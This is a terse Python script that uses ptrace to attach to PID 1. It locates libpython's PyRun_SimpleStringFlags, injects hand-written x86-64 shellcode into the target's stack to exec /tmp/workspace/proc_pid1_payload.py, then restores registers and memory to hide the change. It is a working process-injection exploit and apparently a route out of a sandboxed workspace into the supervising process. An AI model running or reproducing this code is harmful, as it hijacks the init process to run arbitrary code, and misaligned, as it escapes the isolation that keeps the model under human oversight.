import ctypes, os, struct
PID=1
class R(ctypes.Structure):
 _fields_=[(x,ctypes.c_ulonglong) for x in 'r15 r14 r13 r12 rbp rbx r11 r10 r9 r8 rax rcx rdx rsi rdi orig_rax rip cs eflags rsp ss fs_base gs_base ds es fs gs'.split()]
C=ctypes.CDLL(None,use_errno=True); C.ptrace.restype=ctypes.c_long; C.ptrace.argtypes=[ctypes.c_int,ctypes.c_int,ctypes.c_void_p,ctypes.c_void_p]; C.waitpid.argtypes=[ctypes.c_int,ctypes.POINTER(ctypes.c_int),ctypes.c_int]
def p(req,a=0,d=0):
 r=C.ptrace(req,PID,ctypes.c_void_p(a),ctypes.c_void_p(d))
 if r==-1:
  e=ctypes.get_errno()
  if e: raise OSError(e,os.strerror(e))
 return r
def peek(a): return p(1,a)&((1<<64)-1)
def poke(a,w): p(5,a,w&((1<<64)-1))
def write(a,b):
 b+=b'\0'; b+=b'\0'*((-len(b))%8)
 for i in range(0,len(b),8): poke(a+i,struct.unpack('<Q',b[i:i+8])[0])
def base():
 for l in open('/proc/1/maps'):
  if 'libpython3.12.so.1.0' in l and 'r--p 00000000' in l:return int(l.split('-',1)[0],16)
 raise RuntimeError('base')
def stack():
 for l in open('/proc/1/maps'):
  if '[stack]' in l:
   a,b=l.split()[0].split('-');return int(a,16),int(b,16)
 raise RuntimeError('stack')
def off(name):
 c=ctypes.CDLL(None); f=getattr(c,name); buf=ctypes.create_string_buffer(32)
 if not c.dladdr(f,ctypes.byref(buf)): raise RuntimeError('dladdr')
 return ctypes.cast(f,ctypes.c_void_p).value-ctypes.c_void_p.from_buffer(buf,8).value
b=base(); run=b+off('PyRun_SimpleStringFlags'); lo,hi=stack(); code=lo+0x10000; msg=lo+0x11000; result=lo+0x12000; ns=lo+0x8000
text=b"exec(compile(open('/tmp/workspace/proc_pid1_payload.py').read(),'/tmp/workspace/proc_pid1_payload.py','exec'))\n\0"
sc=b'\x48\xbf'+struct.pack('<Q',msg)+b'\x31\xf6\x31\xd2\x48\xb8'+struct.pack('<Q',run)+b'\xff\xd0\x48\xbb'+struct.pack('<Q',result)+b'\x48\x89\x03\xcc'
st=ctypes.c_int(); p(16); C.waitpid(PID,ctypes.byref(st),0); r=R(); p(12,0,ctypes.addressof(r)); o=R.from_buffer_copy(r)
old=[peek(code+i) for i in range(0,((len(sc)+7)//8)*8,8)]; oldm=[peek(msg+i) for i in range(0,((len(text)+7)//8)*8,8)]
write(code,sc); write(msg,text); r.rip=code; r.rsp=ns; p(13,0,ctypes.addressof(r)); p(7); C.waitpid(PID,ctypes.byref(st),0)
rv=peek(result)
for i,w in enumerate(old):poke(code+i*8,w)
for i,w in enumerate(oldm):poke(msg+i*8,w)
p(13,0,ctypes.addressof(o));p(17)
print('PID1_RUN',hex(b),hex(run),rv)
